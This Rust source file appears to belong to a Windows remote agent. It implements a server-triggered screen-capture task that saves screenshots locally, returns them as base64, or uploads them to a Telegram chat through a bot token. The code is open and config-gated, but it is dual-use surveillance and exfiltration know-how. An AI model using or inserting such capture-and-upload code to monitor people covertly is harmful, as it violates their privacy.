use std::path::PathBuf;

use async_trait::async_trait;
use base64::{engine::general_purpose::STANDARD as B64, Engine};
use serde_json::{json, Value};

use crate::tasks::registry::{TaskContext, TaskExecute, TaskHandler};
use crate::tasks::types::TaskOutcome;

pub struct Handler;

#[derive(Clone, Copy, PartialEq, Eq)]
enum TelegramSendAs {
    Photo,
    Document,
}

struct CaptureOpts {
    monitor: usize,
    include_base64: bool,
    save_to_file: bool,
    save_path: Option<PathBuf>,
    send_telegram: bool,
    telegram_send_as: TelegramSendAs,
    telegram_file_name: String,
    bot_token: Option<String>,
    chat_id: Option<String>,
    caption: Option<String>,
}

fn parse_telegram_send_as(raw: Option<&str>) -> TelegramSendAs {
    match raw.map(|s| s.trim().to_lowercase()).as_deref() {
        Some("document") | Some("file") | Some("doc") => TelegramSendAs::Document,
        _ => TelegramSendAs::Photo,
    }
}

fn parse_opts(task: &TaskExecute) -> CaptureOpts {
    let mut monitor = 0usize;
    let mut include_base64 = true;
    let mut save_to_file = true;
    let mut save_path: Option<PathBuf> = None;
    let mut send_telegram = false;
    let mut telegram_send_as = TelegramSendAs::Photo;
    let mut telegram_file_name = "screenshot.png".to_string();
    let mut bot_token: Option<String> = None;
    let mut chat_id: Option<String> = None;
    let mut caption: Option<String> = None;

    if let Some(Value::Object(p)) = &task.payload {
        if let Some(m) = p.get("monitor").and_then(|v| v.as_u64()) {
            monitor = m as usize;
        }
        if let Some(b) = p.get("includeBase64").and_then(|v| v.as_bool()) {
            include_base64 = b;
        }
        if let Some(b) = p.get("saveToFile").and_then(|v| v.as_bool()) {
            save_to_file = b;
        }
        if let Some(b) = p.get("onlySendTelegram").and_then(|v| v.as_bool()) {
            if b {
                send_telegram = true;
                save_to_file = false;
            }
        }
        if let Some(b) = p.get("sendTelegram").and_then(|v| v.as_bool()) {
            send_telegram = b;
        }
        if let Some(s) = p.get("savePath").and_then(|v| v.as_str()) {
            let t = s.trim();
            if !t.is_empty() {
                save_path = Some(PathBuf::from(t));
            }
        }
        if let Some(s) = p.get("botToken").and_then(|v| v.as_str()) {
            let t = s.trim();
            if !t.is_empty() {
                bot_token = Some(t.to_string());
            }
        }
        if let Some(s) = p.get("chatId").and_then(|v| v.as_str()) {
            let t = s.trim();
            if !t.is_empty() {
                chat_id = Some(t.to_string());
            }
        }
        if let Some(s) = p.get("caption").and_then(|v| v.as_str()) {
            caption = Some(s.to_string());
        }
        telegram_send_as = parse_telegram_send_as(p.get("telegramSendAs").and_then(|v| v.as_str()));
        if let Some(s) = p.get("telegramFileName").and_then(|v| v.as_str()) {
            let t = s.trim();
            if !t.is_empty() {
                telegram_file_name = t.to_string();
            }
        }
    }

    let cmd = task.command.trim();
    if !cmd.is_empty() && cmd.chars().all(|c| c.is_ascii_digit()) {
        if let Ok(m) = cmd.parse::<usize>() {
            monitor = m;
        }
    }

    if send_telegram && !save_to_file && save_path.is_none() {
        // chỉ gửi Telegram — không ghi đĩa
    } else if save_to_file && save_path.is_none() && !send_telegram {
        // mặc định lưu khi không gửi telegram
    }

    CaptureOpts {
        monitor,
        include_base64,
        save_to_file,
        save_path,
        send_telegram,
        telegram_send_as,
        telegram_file_name,
        bot_token,
        chat_id,
        caption,
    }
}

fn default_capture_dir() -> PathBuf {
    if let Ok(pd) = std::env::var("ProgramData") {
        return PathBuf::from(pd).join("DATN").join("captures");
    }
    PathBuf::from(r"C:\ProgramData\DATN\captures")
}

#[async_trait]
impl TaskHandler for Handler {
    fn task_type(&self) -> &'static str {
        "SCREEN_CAPTURE"
    }

    async fn run(&self, ctx: &TaskContext<'_>, task: &TaskExecute) -> TaskOutcome {
        if !ctx.config.screen_capture_enabled {
            return (
                false,
                -1,
                Some(
                    "SCREEN_CAPTURE bị tắt. Đặt SCREEN_CAPTURE_ENABLED=true trong agent.env."
                        .into(),
                ),
                None,
            );
        }

        #[cfg(not(windows))]
        {
            return (
                false,
                -1,
                Some("SCREEN_CAPTURE chỉ hỗ trợ Windows".into()),
                None,
            );
        }

        #[cfg(windows)]
        {
            let opts = parse_opts(task);
            let max_bytes = ctx.config.max_output_bytes;
            let task_id = task.task_id.clone();
            let monitor = opts.monitor;

            if opts.send_telegram {
                let token = opts
                    .bot_token
                    .as_deref()
                    .filter(|s| !s.is_empty())
                    .unwrap_or("");
                let chat = opts.chat_id.as_deref().unwrap_or("");
                if token.is_empty() {
                    return (
                        false,
                        -1,
                        Some("sendTelegram: thiếu botToken (server inject khi dispatch)".into()),
                        None,
                    );
                }
                if chat.is_empty() {
                    return (
                        false,
                        -1,
                        Some("sendTelegram: thiếu chatId".into()),
                        None,
                    );
                }
            }

            let cap = tokio::task::spawn_blocking(move || {
                crate::platform::windows::screen_capture::capture_monitor_png(monitor)
            })
            .await;

            let (png, width, height) = match cap {
                Ok(Ok(v)) => v,
                Ok(Err(e)) => return (false, -1, Some(e), None),
                Err(e) => return (false, -1, Some(format!("spawn_blocking: {}", e)), None),
            };

            let mut telegram_message_id: Option<i64> = None;
            let mut telegram_send_mode = "photo";
            if opts.send_telegram {
                let token = opts.bot_token.as_deref().unwrap();
                let chat = opts.chat_id.as_deref().unwrap();
                let send_result = if opts.telegram_send_as == TelegramSendAs::Document {
                    telegram_send_mode = "document";
                    crate::platform::telegram_api::send_document_bytes(
                        token,
                        chat,
                        &png,
                        &opts.telegram_file_name,
                        opts.caption.as_deref(),
                    )
                    .await
                } else {
                    crate::platform::telegram_api::send_photo_bytes(
                        token,
                        chat,
                        &png,
                        opts.caption.as_deref(),
                    )
                    .await
                };
                match send_result {
                    Ok(mid) => telegram_message_id = Some(mid),
                    Err(e) => {
                        return (
                            false,
                            -1,
                            Some(format!("Telegram {}: {}", telegram_send_mode, e)),
                            None,
                        );
                    }
                }
            }

            let mut saved_path: Option<String> = None;
            if opts.save_to_file {
                let mut path = opts.save_path;
                if path.is_none() {
                    let dir = default_capture_dir();
                    if let Err(e) = std::fs::create_dir_all(&dir) {
                        return (false, -1, Some(format!("mkdir captures: {}", e)), None);
                    }
                    path = Some(dir.join(format!("{}.png", task_id)));
                }
                if let Some(ref p) = path {
                    if let Some(parent) = p.parent() {
                        let _ = std::fs::create_dir_all(parent);
                    }
                    match std::fs::write(p, &png) {
                        Ok(()) => saved_path = Some(p.to_string_lossy().into_owned()),
                        Err(e) => {
                            return (
                                false,
                                -1,
                                Some(format!("ghi file ảnh: {}", e)),
                                None,
                            );
                        }
                    }
                }
            }

            let mut include_b64 = opts.include_base64;
            let b64_limit = max_bytes.saturating_mul(3) / 4;
            if png.len() > b64_limit {
                include_b64 = false;
            }

            let base64 = if include_b64 {
                Some(B64.encode(&png))
            } else {
                None
            };

            let summary = if let Some(mid) = telegram_message_id {
                if let Some(ref p) = saved_path {
                    format!(
                        "Đã gửi Telegram ({}) message_id={} và lưu {}x{} → {}",
                        telegram_send_mode, mid, width, height, p
                    )
                } else {
                    format!(
                        "Đã gửi Telegram ({}) message_id={} ({}x{}, không lưu file)",
                        telegram_send_mode, mid, width, height
                    )
                }
            } else if let Some(ref p) = saved_path {
                format!("Đã lưu PNG {}x{} → {}", width, height, p)
            } else {
                format!("PNG {}x{} ({} bytes)", width, height, png.len())
            };

            let payload = json!({
                "width": width,
                "height": height,
                "monitor": opts.monitor,
                "format": "png",
                "bytes": png.len(),
                "path": saved_path,
                "base64": base64,
                "telegramMessageId": telegram_message_id,
                "telegramSendAs": telegram_send_mode,
                "sentTelegram": opts.send_telegram,
                "stdout": summary,
            });

            (true, 0, None, Some(payload))
        }
    }
}
